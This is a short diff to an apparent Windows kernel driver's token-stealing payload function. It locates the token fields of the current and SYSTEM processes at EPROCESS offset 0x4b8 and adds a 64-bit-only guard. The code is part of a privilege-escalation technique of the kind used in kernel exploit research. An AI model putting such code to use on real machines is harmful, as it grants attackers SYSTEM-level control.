@@ -32,10 +32,13 @@ VOID TokenStealingPayloadPsReferencePrimaryToken(HANDLE PID) {
 
 	EX_FAST_REF* ctoken_ptr = (EX_FAST_REF*)TargetToken;
 	EX_FAST_REF* stoken_ptr = (EX_FAST_REF*)SystemToken;
-
-	ULONGLONG* ctoken_ptr2 = (ULONGLONG*)((ULONG_PTR)CurrentProcess + +0x4b8);
-	ULONGLONG* stoken_ptr2 = (ULONGLONG*)((ULONG_PTR)SystemProcess + +0x4b8);
-
+#ifdef _WIN64
+	ULONGLONG* ctoken_ptr2 = (ULONGLONG*)((ULONG_PTR)CurrentProcess + 0x4b8);
+	ULONGLONG* stoken_ptr2 = (ULONGLONG*)((ULONG_PTR)SystemProcess + 0x4b8);
+#else
+	DbgPrint(DRIVER_PREFIX " Only 64 bit supported");
+	return;
+#endif
 	DbgPrint(DRIVER_PREFIX " System EPROCESS         : %p", SystemProcess);
 	DbgPrint(DRIVER_PREFIX " Current Process EPROCESS: %p", CurrentProcess);
 
